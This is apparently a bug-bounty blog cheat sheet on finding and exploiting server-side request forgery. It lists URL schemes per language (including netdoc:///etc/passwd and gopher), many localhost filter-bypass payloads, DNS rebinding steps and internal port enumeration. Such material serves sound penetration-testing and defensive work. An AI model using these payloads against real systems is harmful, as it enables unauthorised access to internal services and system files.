## How to Find SSRF Vulnerabilities[](https://highon.coffee/blog/ssrf-cheat-sheet/#how-to-find-ssrf-vulnerabilities)

In order to identify a SSRF vulnerability the first step is confirming that the functionality is vulnerable, an easy / scalable way to do this [is using your own Burp Collaborator on Linode using this link to get a $100 voucher](https://www.linode.com/?r=de68d06f20e245c4952795b3a57180b223ff4d42). Burp Collaborator will easily allow you to assess if out-of-band interaction is possible (the target server directly accessing a server you control).

##### PRO TIP: Run Your Own Collaborator Server

If you are taking part in bug bounty programs run your own Burp Collaborator server as often the default Burp Collaborator service domain is filtered, giving you an increased chance of detection.

[Linode works great for this](https://www.linode.com/?r=de68d06f20e245c4952795b3a57180b223ff4d42), it's cheap, fixed price and has a direct public IP address.

It should be noted that a function may still, potentially be vulnerable even if not identifid via Burp Collaborator, this is typically due to the target server not allowing outbound dns or strict egress firewall rules.

## SSRF Whitelist Filter Bypass[](https://highon.coffee/blog/ssrf-cheat-sheet/#ssrf-whitelist-filter-bypass)

### Timing Difference[](https://highon.coffee/blog/ssrf-cheat-sheet/#timing-difference)

At the detection phase, try timing difference on responses to see if there is filtering in place when different domains, IP’s or ports are being fitlered.

### URL Schema / Wrappers[](https://highon.coffee/blog/ssrf-cheat-sheet/#url-schema--wrappers)

The following URL schemas can be potentially exploited by SSRF vulnerabilies.

The URL schemas have been sorted by framework / language.

#### PHP SSRF Wrappers / URL Schema[](https://highon.coffee/blog/ssrf-cheat-sheet/#php-ssrf-wrappers--url-schema)

The following wrappers are potentiall expected URL schema wrappers found within PHP environments (for some schema curl-wrappers would need to be enabled).

```bash
gopher://
fd://
expect://
ogg://
tftp://
dict://
ftp://
ssh2://
file://
http://
https://
imap://
pop3://
mailto://
smtp://
telnet://
```

#### ASP.NET SSRF Wrappers / URL Schema[](https://highon.coffee/blog/ssrf-cheat-sheet/#aspnet-ssrf-wrappers--url-schema)

The following wrappers are potentiall expected URL schema wrappers found within ASP.NET environments (gopher legacy only).

```bash
gopher://
ftp://
file://
http://
https://
```

#### Java SSRF Wrappers / URL Schema[](https://highon.coffee/blog/ssrf-cheat-sheet/#java-ssrf-wrappers--url-schema)

The following wrappers are expected within Java environments, and can be used to potentially exploit [LFI](https://highon.coffee/blog/lfi-cheat-sheet/) vulnerabilities.

```bash
 
ftp://
file://
http://
https://
gopher://
netdoc:///etc/passwd
netdoc:///etc/hosts
jar:proto-schema://blah!/
jar:http://localhost!/
jar:http://127.0.0.1!/
jar:http://0.0.0.0!/
jar:ftp://local-domain.com!/
```

##### NOTE: OpenJDK 8+ Redirects

It should be noted that OpenJDK 8+ does not follow redirects if the protocols do not match.

#### cURL SSRF Wrappers / URL Schema[](https://highon.coffee/blog/ssrf-cheat-sheet/#curl-ssrf-wrappers--url-schema)

The following wrappers are expected with environments using cURL.

```bash
file:///
dict://
sftp://
ldap://
tftp://
gopher://
ssh://
http://
https://
imap://
pop3://
smtp://
telnet://
```

### Open Redirect SSRF Bypass[](https://highon.coffee/blog/ssrf-cheat-sheet/#open-redirect-ssrf-bypass)

Open redirects can potentially be used to bypass server side whitelist filtering, by appearing to be from the target domain (which has an increased chance of being whitelisted).

Example:

```bash
/foo/bar?vuln-function=http://127.0.0.1:8888/secret
```

### Basic locahost bypass attempts[](https://highon.coffee/blog/ssrf-cheat-sheet/#basic-locahost-bypass-attempts)

Localhost bypass:

```bash
All IPv4: 0
All IPv6: ::
All IPv4: 0.0.0.0
Localhost IPv6: ::1
All IPv4: 0000
All IPv4: (Leading zeros): 00000000
IPv4 mapped IPv6 address: 0:0:0:0:0:FFFF:7F00:0001
8-Bit Octal conversion: 0177.00.00.01
32-Bit Octal conversion: 017700000001
32-Bit Hex conversion: 0x7f000001
```

various bypasses:

```bash
127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
127.1:80
0
0.0.0.0:80
localhost:80
[::]:80/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:80/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:80\@127.2.2.2:80/
127.1.1.1:80\@@127.2.2.2:80/
127.1.1.1:80:\@@127.2.2.2:80/
127.1.1.1:80#\@127.2.2.2:80/
```

### hosts file bypass attempts[](https://highon.coffee/blog/ssrf-cheat-sheet/#hosts-file-bypass-attempts)

### Enclosed Alphanumeric[](https://highon.coffee/blog/ssrf-cheat-sheet/#enclosed-alphanumeric)

```bash
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
```

## DNS rebinding attempts[](https://highon.coffee/blog/ssrf-cheat-sheet/#dns-rebinding-attempts)

### What is a DNS rebinding attack?[](https://highon.coffee/blog/ssrf-cheat-sheet/#what-is-a-dns-rebinding-attack)

In certain situations a target function may check a hostname “blindly” against a whitelist/blacklist without verification of the the resolution IP address. Once the hostname has been determined OK by the above function it is then passed to the function which it is intended to protect.

### How to exploit a vulnerable function[](https://highon.coffee/blog/ssrf-cheat-sheet/#how-to-exploit-a-vulnerable-function)

You can setup a DNS server that resolves to the whitelist, then have a short TTL which changes to the IP you want to exploit e.g. 127.0.0.1 for SSRF, or any other internal IP.

Fortunately taviso has built a [service for this](https://github.com/taviso/rbndr) which you can use to generate a dword subdomain and use against your target. The downside to this service is that it appears to flip the resolution IP back and forth, so it may change during the attack.

You can use the follow web app to generate your rebinder domain: https://lock.cmpxchg8b.com/rebinder.html

To overcome this issue, have one of the resolution IP addresses in your control and verify the response of that IP request, to help determine if the target functionality is vulnerable.

1.  go to https://lock.cmpxchg8b.com/rebinder.html add your IP’s
2.  check it works with host
3.  attempt to exploit the SSRF location with it

## Post Exploitation / Enumeration[](https://highon.coffee/blog/ssrf-cheat-sheet/#post-exploitation--enumeration)

In an effort to demonstrate the severity of the SSRF vulnerability enumeration of server side ports could be performed using Burp Intruder.

The above process could be performed to enumerate other local IP addresses and/or bruteforcing URL (IDOR / Forced Browsing) to identify services or functionality that was not intended by the organisation.

Happy hunting / pen testing.